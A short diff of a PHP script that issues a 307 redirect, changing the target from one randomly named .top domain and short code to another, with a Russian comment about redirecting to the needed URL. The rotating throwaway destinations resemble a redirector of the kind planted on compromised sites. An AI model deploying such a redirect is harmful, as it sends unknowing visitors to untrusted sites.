@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://serversiquorixa.top/sDy81P');
+header('Location: https://serversolentix.top/xBDVk8');
 exit();
 ?>
